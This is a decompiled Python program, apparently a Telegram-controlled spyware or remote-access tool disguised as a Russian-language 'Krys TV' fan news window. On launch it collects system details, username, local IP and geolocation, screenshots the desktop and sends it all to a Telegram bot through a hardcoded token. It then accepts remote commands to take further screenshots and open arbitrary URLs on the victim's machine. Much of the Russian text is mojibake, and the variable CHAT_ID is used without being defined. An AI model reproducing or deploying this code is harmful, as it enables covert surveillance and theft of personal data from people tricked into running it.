# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Downloads\sus.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import time
import telebot
import psutil
import platform
import socket
import os
import webbrowser
import pyautogui
from PIL import Image, ImageTk
import requests
TOKEN = '6772619419:AAEojA3fUvZOJR5vYZasGbEP9PIdV_KXkWg'
bot = telebot.TeleBot(TOKEN)
last_screenshot = None
BG_COLOR = '#1e1e1e'
TEXT_COLOR = '#f0f0f0'
ACCENT_COLOR = '#ff5555'
FONT_MAIN = ('Arial', 11)
FONT_TITLE = ('Arial', 16, 'bold')

def get_system_info():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ"""
    try:
        ip_info = requests.get('https://ipinfo.io/json').json()
        location = f"{ip_info.get('city', '?')}, {ip_info.get('country', '?')}"
        org = ip_info.get('org', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')
    except:
        location = '–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å'
        org = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
    info = {'üêÄ –°–∏—Å—Ç–µ–º–∞': f'{platform.system()} {platform.release()}', 'üíª –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä': platform.processor(), 'üß† –ü–∞–º—è—Ç—å': f'{round(psutil.virtual_memory().total / 1073741824.0, 2)} GB', 'üìÅ –î–∏—Å–∫': os.getlogin(), 'üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å': socket.gethostbyname(socket.gethostname()), 'üåê –õ–æ–∫–∞–ª—å–Ω—ã–π IP': location, 'üìç –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ': org, 'üè¢ –ü—Ä–æ–≤–∞–π–¥–µ—Ä': '–°–≤–∏–Ω—å—è –æ–ø—É—â–µ–Ω–∞ [OK]', 'üîê –°–ø–µ—Ü—Å—Ç–∞—Ç—É—Å': time.strftime('%Y-%m-%d %H:%M:%S')}
    return '\n'.join([f'{k}: {v}' for k, v in info.items()])

def send_initial_data():
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ"""
    try:
        bot.send_message(CHAT_ID, f'üöÄ –ö—Ä—ã—Å-—Å–∏—Å—Ç–µ–º–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞!\n{get_system_info()}')
        screenshot_path = 'startup_screen.png'
        pyautogui.screenshot(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
        bot.send_message(CHAT_ID, f"üíæ –î–∏—Å–∫: {psutil.disk_usage('/').percent}% –∑–∞–ø–æ–ª–Ω–µ–Ω–æ\nüî• CPU: {psutil.cpu_percent()}% –Ω–∞–≥—Ä—É–∑–∫–∏\nüß† RAM: {psutil.virtual_memory().percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è")
    except Exception as e:
        print(f'–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö: {e}')

@bot.message_handler(commands=['lol'])
def send_last_screenshot(message):
    try:
        screenshot_path = 'startup_screen.png'
        pyautogui.screenshot(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
    except Exception as e:
        bot.reply_to(message, f'‚ö† –û—à–∏–±–∫–∞: {str(e)}')

@bot.message_handler(commands=['url'])
def open_url_command(message):
    try:
        url = message.text.split()[1]
        webbrowser.open(url)
        bot.reply_to(message, f'üåê –û—Ç–∫—Ä—ã—Ç–æ: {url}')
    except IndexError:
        bot.reply_to(message, '‚ùå –£–∫–∞–∂–∏—Ç–µ URL –ø–æ—Å–ª–µ /url')
    except Exception as e:
        bot.reply_to(message, f'‚ö† –û—à–∏–±–∫–∞: {str(e)}')

class KrysApp(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title('–ö—Ä—ã—Å –¢–í')
        self.geometry('800x600')
        self.configure(bg=BG_COLOR)
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background=BG_COLOR, foreground=TEXT_COLOR)
        self.style.configure('TLabel', font=FONT_MAIN)
        self.style.configure('Title.TLabel', font=FONT_TITLE, foreground=ACCENT_COLOR)
        self.create_widgets()
        threading.Thread(target=self.start_bot, daemon=True).start()
        threading.Thread(target=send_initial_data, daemon=True).start()

    def create_widgets(self):
        """–°–æ–∑–¥–∞–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞"""
        header = ttk.Frame(self)
        header.pack(pady=20, fill=tk.X)
        ttk.Label(header, text='üêÄ –ö–†–´–° –¢–í - –û–§–ò–¶–ò–ê–õ–¨–ù–´–ô –ö–ê–ù–ê–õ', style='Title.TLabel').pack()
        timer_frame = ttk.Frame(self)
        timer_frame.pack(pady=10)
        ttk.Label(timer_frame, text='–î–æ –ø—Ä–µ–º—å–µ—Ä—ã –Ω–æ–≤–æ–≥–æ —Ç—Ä–µ–∫–∞:').pack(side=tk.LEFT)
        self.timer_label = ttk.Label(timer_frame, text='‚àû', font=('Arial', 14, 'bold'), foreground=ACCENT_COLOR)
        self.timer_label.pack(side=tk.LEFT, padx=5)
        news_frame = ttk.LabelFrame(self, text='–≠–ö–°–ö–õ–Æ–ó–ò–í–ù–´–ï –ù–û–í–û–°–¢–ò', padding=15)
        news_frame.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)
        self.news_text = scrolledtext.ScrolledText(news_frame, wrap=tk.WORD, font=FONT_MAIN, bg='#252525', fg=TEXT_COLOR, padx=10, pady=10)
        self.news_text.pack(fill=tk.BOTH, expand=True)
        self.update_news()
        threading.Thread(target=self.update_timer, daemon=True).start()

    def update_news(self):
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –Ω–æ–≤–æ—Å—Ç–Ω–æ–π –ª–µ–Ω—Ç—ã"""
        news_content = '\nüî• [–°–†–û–ß–ù–´–ï –ù–û–í–û–°–¢–ò] üî•\n\n–ö—Ä—ã—Å –ö—Ä—ã—Å–æ–≤–∏—á –∑–∞–≤–µ—Ä—à–∏–ª —Ä–∞–±–æ—Ç—É –Ω–∞–¥ —Ä–µ–≤–æ–ª—é—Ü–∏–æ–Ω–Ω—ã–º —Ç—Ä–µ–∫–æ–º, \n–∫–æ—Ç–æ—Ä—ã–π –ø–µ—Ä–µ–≤–µ—Ä–Ω–µ—Ç –≤—Å—é –º—É–∑—ã–∫–∞–ª—å–Ω—É—é –∏–Ω–¥—É—Å—Ç—Ä–∏—é! \n\nüìå –û—Å–Ω–æ–≤–Ω—ã–µ –¥–µ—Ç–∞–ª–∏:\n- –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: 9 –º–∏–Ω—É—Ç 66 —Å–µ–∫—É–Ω–¥\n- –ñ–∞–Ω—Ä: –ö—Ä—ã—Å-–∫–æ—Ä (–Ω–æ–≤—ã–π –∂–∞–Ω—Ä)\n- –û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏: 10-—Å–ª–æ–π–Ω—ã–π —Ä–µ–≤, –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–π –≤ –∫–∞–Ω–∞–ª–∏–∑–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ç—Ä—É–±–∞—Ö –ú–æ—Å–∫–≤—ã\n\nüí£ [–°–ö–ê–ù–î–ê–õ] \n–ù–∞—à –∏–Ω—Å–∞–π–¥–µ—Ä –≤ —Å—Ç—É–¥–∏–∏ SoundCloud –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª, \n—á—Ç–æ –∞–ª–≥–æ—Ä–∏—Ç–º—ã —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–π –±—ã–ª–∏ –∏–∑–º–µ–Ω–µ–Ω—ã –ø–æ—Å–ª–µ \n–∑–Ω–∞–º–µ–Ω–∏—Ç–æ–≥–æ "–∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ —Å–æ —Å–≤–∏–Ω—å–µ–π". \n\nxDevster –ø—ã—Ç–∞–ª—Å—è –ø—Ä–æ—Ç–µ—Å—Ç–æ–≤–∞—Ç—å, –Ω–æ –µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç \n—Ç–∞–∏–Ω—Å—Ç–≤–µ–Ω–Ω—ã–º –æ–±—Ä–∞–∑–æ–º –ø–æ–ª—É—á–∏–ª 1000 —Ñ–µ–π–∫–æ–≤—ã—Ö –∂–∞–ª–æ–±.\n\nüéµ [–¢–ï–•–ù–ò–ß–ï–°–ö–ò–ï –î–ï–¢–ê–õ–ò]\n–¢—Ä–µ–∫ –±—É–¥–µ—Ç —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—è—Ç—å—Å—è —á–µ—Ä–µ–∑:\n- –°–µ–∫—Ä–µ—Ç–Ω—ã–µ –º–∞–≥–Ω–∏—Ç–Ω—ã–µ —Å—Å—ã–ª–∫–∏\n- –ó–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ä–∞–¥–∏–æ—Å–∏–≥–Ω–∞–ª—ã\n- –ü–æ–¥–∑–µ–º–Ω—ã–µ —Ç–æ—á–∫–∏ –æ–±–º–µ–Ω–∞ –≤ 15 –≥–æ—Ä–æ–¥–∞—Ö –°–ù–ì\n\nüïí [–¢–ê–ô–ú–ï–† –î–û –†–ï–õ–ò–ó–ê]\n–û—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è –¥–∞—Ç–∞ –Ω–µ –æ–±—ä—è–≤–ª–µ–Ω–∞, –Ω–æ —Å–∏—Å—Ç–µ–º–∞ \n–æ—Ç—Å—á–µ—Ç–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –æ—Å—Ç–∞–ª–æ—Å—å –∂–¥–∞—Ç—å: ‚àû\n'
        self.news_text.insert(tk.END, news_content)
        self.news_text.config(state=tk.DISABLED)

    def update_timer(self):
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ–≥–æ —Ç–∞–π–º–µ—Ä–∞"""
        while True:
            self.timer_label.config(text='‚àû')
            time.sleep(1)

    def start_bot(self):
        """–ó–∞–ø—É—Å–∫ Telegram –±–æ—Ç–∞"""
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f'–û—à–∏–±–∫–∞ –±–æ—Ç–∞: {e}')
if __name__ == '__main__':
    app = KrysApp()
    app.mainloop()